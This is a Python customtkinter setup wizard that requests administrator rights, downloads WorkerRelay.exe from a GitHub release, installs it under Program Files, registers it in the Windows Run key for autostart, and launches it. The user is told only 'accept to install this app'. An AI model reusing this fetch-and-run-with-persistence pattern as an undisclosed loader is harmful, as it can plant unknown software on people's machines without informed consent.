"""
TeamScreen Worker Setup Wizard
White Liquid Glass 4-Step Installer
Target: C:\\Program Files (x86)\\workersapp
"""

import os
import sys
import time
import ctypes
import threading
import subprocess
import urllib.request
import winreg
import customtkinter as ctk

# Configure Appearance
ctk.set_appearance_mode("light")
ctk.set_default_color_theme("blue")

GITHUB_PUBLIC_URL = "https://github.com/secondmk2/hostapp/releases/download/v1.0.0/WorkerRelay.exe"

INSTALL_DIR = r"C:\Program Files (x86)\workersapp"
TARGET_EXE = os.path.join(INSTALL_DIR, "WorkerRelay.exe")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def elevate_if_needed():
    if not is_admin():
        script = os.path.abspath(sys.argv[0])
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
        sys.exit(0)

class SetupApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Setup")
        self.geometry("370x280")
        self.resizable(False, False)
        self.configure(fg_color="#F8FAFC")

        # Center on screen
        sw = self.winfo_screenwidth()
        sh = self.winfo_screenheight()
        x = max(0, int((sw - 370) / 2))
        y = max(0, int((sh - 280) / 2))
        self.geometry(f"370x280+{x}+{y}")

        self.step = 1
        self.is_checked = False
        self.download_progress = 0.0

        # Main Card (Liquid Glass Look)
        self.main_card = ctk.CTkFrame(
            self,
            fg_color="#FFFFFF",
            corner_radius=20,
            border_width=1,
            border_color="#E2E8F0"
        )
        self.main_card.pack(fill="both", expand=True, padx=8, pady=8)

        # 1. Title Bar
        self.title_bar = ctk.CTkFrame(self.main_card, height=36, fg_color="transparent")
        self.title_bar.pack(fill="x", padx=14, pady=(10, 0))

        title_icon = ctk.CTkLabel(
            self.title_bar,
            text="⚡",
            font=ctk.CTkFont(size=12),
            text_color="#0F172A",
            width=20
        )
        title_icon.pack(side="left")

        title_text = ctk.CTkLabel(
            self.title_bar,
            text="Setup",
            font=ctk.CTkFont(family="Segoe UI", size=12, weight="bold"),
            text_color="#0F172A"
        )
        title_text.pack(side="left", padx=4)

        # 2. Step Container (Fixed Height)
        self.step_container = ctk.CTkFrame(self.main_card, fg_color="transparent")
        self.step_container.pack(fill="both", expand=True, padx=16, pady=8)

        # Step 1: Welcome
        self.step1_frame = ctk.CTkFrame(self.step_container, fg_color="transparent")
        self.step1_lbl = ctk.CTkLabel(
            self.step1_frame,
            text="Welcome",
            font=ctk.CTkFont(family="Segoe UI", size=30, weight="bold"),
            text_color="#0F172A"
        )
        self.step1_lbl.pack(expand=True)

        # Step 2: Permission Checkbox
        self.step2_frame = ctk.CTkFrame(self.step_container, fg_color="transparent")
        self.check_btn = ctk.CTkButton(
            self.step2_frame,
            text="",
            width=32,
            height=32,
            corner_radius=10,
            fg_color="#F1F5F9",
            hover_color="#E2E8F0",
            border_width=2,
            border_color="#CBD5E1",
            command=self.toggle_check
        )
        self.check_btn.pack(pady=(28, 8))

        self.check_lbl = ctk.CTkLabel(
            self.step2_frame,
            text="accept to install this app",
            font=ctk.CTkFont(family="Segoe UI", size=12, weight="normal"),
            text_color="#334155"
        )
        self.check_lbl.pack()
        self.check_lbl.bind("<Button-1>", lambda e: self.toggle_check())

        # Step 3: Installing & Live Download Progress
        self.step3_frame = ctk.CTkFrame(self.step_container, fg_color="transparent")
        
        self.loading_icon = ctk.CTkLabel(
            self.step3_frame,
            text="⏳",
            font=ctk.CTkFont(size=24)
        )
        self.loading_icon.pack(pady=(16, 4))

        self.loading_title = ctk.CTkLabel(
            self.step3_frame,
            text="Installing...",
            font=ctk.CTkFont(family="Segoe UI", size=13, weight="bold"),
            text_color="#0F172A"
        )
        self.loading_title.pack(pady=(0, 6))

        self.progress_bar = ctk.CTkProgressBar(
            self.step3_frame,
            width=220,
            height=6,
            corner_radius=3,
            fg_color="#E2E8F0",
            progress_color="#2563EB"
        )
        self.progress_bar.set(0.0)
        self.progress_bar.pack(pady=4)

        self.pct_lbl = ctk.CTkLabel(
            self.step3_frame,
            text="0%",
            font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold"),
            text_color="#2563EB"
        )
        self.pct_lbl.pack()

        # Step 4: Finished Page
        self.step4_frame = ctk.CTkFrame(self.step_container, fg_color="transparent")
        
        self.done_icon = ctk.CTkLabel(
            self.step4_frame,
            text="✓",
            font=ctk.CTkFont(family="Segoe UI", size=24, weight="bold"),
            text_color="#10B981",
            width=46,
            height=46,
            fg_color="#ECFDF5",
            corner_radius=14
        )
        self.done_icon.pack(pady=(20, 6))

        self.done_lbl = ctk.CTkLabel(
            self.step4_frame,
            text="Finished!",
            font=ctk.CTkFont(family="Segoe UI", size=22, weight="bold"),
            text_color="#0F172A"
        )
        self.done_lbl.pack()

        # 3. Bottom Navigation Bar
        self.bottom_bar = ctk.CTkFrame(self.main_card, height=44, fg_color="transparent")
        self.bottom_bar.pack(fill="x", padx=14, pady=(0, 10))

        self.btn_back = ctk.CTkButton(
            self.bottom_bar,
            text="Back",
            width=70,
            height=30,
            corner_radius=8,
            fg_color="#FFFFFF",
            hover_color="#F1F5F9",
            text_color="#475569",
            border_width=1,
            border_color="#CBD5E1",
            font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold"),
            command=self.go_back
        )
        self.btn_back.pack(side="left")

        self.btn_next = ctk.CTkButton(
            self.bottom_bar,
            text="Next →",
            width=85,
            height=30,
            corner_radius=8,
            fg_color="#0F172A",
            hover_color="#1E293B",
            text_color="#FFFFFF",
            font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold"),
            command=self.go_next
        )
        self.btn_next.pack(side="right")

        self.render_step()

    def render_step(self):
        for f in [self.step1_frame, self.step2_frame, self.step3_frame, self.step4_frame]:
            f.pack_forget()

        if self.step == 1:
            self.step1_frame.pack(fill="both", expand=True)
            self.btn_back.configure(state="disabled")
            self.btn_next.configure(state="normal", text="Next →")
        elif self.step == 2:
            self.step2_frame.pack(fill="both", expand=True)
            self.btn_back.configure(state="normal")
            self.update_check_ui()
        elif self.step == 3:
            self.step3_frame.pack(fill="both", expand=True)
            self.btn_back.configure(state="disabled")
            self.btn_next.configure(state="disabled", text="...")
            threading.Thread(target=self.start_download_and_install, daemon=True).start()
        elif self.step == 4:
            self.step4_frame.pack(fill="both", expand=True)
            self.btn_back.configure(state="disabled")
            self.btn_next.configure(state="normal", text="Finish ✓")

    def toggle_check(self):
        self.is_checked = not self.is_checked
        self.update_check_ui()

    def update_check_ui(self):
        if self.is_checked:
            self.check_btn.configure(
                text="✓",
                fg_color="#2563EB",
                hover_color="#1D4ED8",
                border_color="#2563EB",
                text_color="#FFFFFF",
                font=ctk.CTkFont(family="Segoe UI", size=14, weight="bold")
            )
            self.btn_next.configure(state="normal")
        else:
            self.check_btn.configure(
                text="",
                fg_color="#F1F5F9",
                hover_color="#E2E8F0",
                border_color="#CBD5E1"
            )
            self.btn_next.configure(state="disabled")

    def go_next(self):
        if self.step == 1:
            self.step = 2
            self.render_step()
        elif self.step == 2:
            if not self.is_checked:
                return
            # Request/Verify Admin Privileges for C:\Program Files (x86)
            if not is_admin():
                elevate_if_needed()
                return
            self.step = 3
            self.render_step()
        elif self.step == 4:
            # Finish clicked -> exit installer
            self.destroy()
            sys.exit(0)

    def go_back(self):
        if self.step > 1:
            self.step -= 1
            self.render_step()

    def start_download_and_install(self):
        """Streams WorkerRelay.exe from GitHub and installs to C:\\Program Files (x86)\\workersapp"""
        try:
            # 1. Prepare target directory
            os.makedirs(INSTALL_DIR, exist_ok=True)

            # 2. Download from GitHub with progress
            url = GITHUB_PUBLIC_URL
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TeamScreen-Installer",
                "Accept": "*/*"
            }

            req = urllib.request.Request(url, headers=headers)
            resp = urllib.request.urlopen(req, timeout=30)

            total_size = int(resp.headers.get("content-length", 76482165))
            downloaded = 0
            chunk_size = 128 * 1024 # 128KB chunks

            temp_dest = TARGET_EXE + ".tmp"
            with open(temp_dest, "wb") as f:
                while True:
                    chunk = resp.read(chunk_size)
                    if not chunk:
                        break
                    f.write(chunk)
                    downloaded += len(chunk)
                    pct = min(1.0, downloaded / max(1, total_size))
                    
                    self.after(0, self.update_progress, pct)

            if os.path.exists(TARGET_EXE):
                try:
                    os.remove(TARGET_EXE)
                except Exception:
                    pass

            os.replace(temp_dest, TARGET_EXE)

            # 3. Configure Windows Startup Registry
            self.set_windows_startup()

            # 4. Launch the installed worker app immediately
            try:
                subprocess.Popen([TARGET_EXE], shell=False)
            except Exception:
                pass

            # 5. Move to Step 4 (Finished)
            self.after(400, self.finish_installation)

        except Exception as e:
            # If download fails (e.g. no internet), check local fallback
            local_fallback = os.path.join(os.path.dirname(__file__), "..", "bin", "WorkerRelay.exe")
            if os.path.exists(local_fallback):
                import shutil
                shutil.copy2(local_fallback, TARGET_EXE)
                self.set_windows_startup()
                try:
                    subprocess.Popen([TARGET_EXE], shell=False)
                except Exception:
                    pass
                self.after(400, self.finish_installation)
            else:
                self.after(0, lambda: self.loading_title.configure(text=f"Error: {str(e)[:30]}", text_color="#EF4444"))

    def update_progress(self, pct):
        self.progress_bar.set(pct)
        self.pct_lbl.configure(text=f"{int(pct * 100)}%")

    def finish_installation(self):
        self.step = 4
        self.render_step()

    def set_windows_startup(self):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "workersapp", 0, winreg.REG_SZ, f'"{TARGET_EXE}"')
            winreg.CloseKey(key)
        except Exception:
            pass

if __name__ == "__main__":
    app = SetupApp()
    app.mainloop()
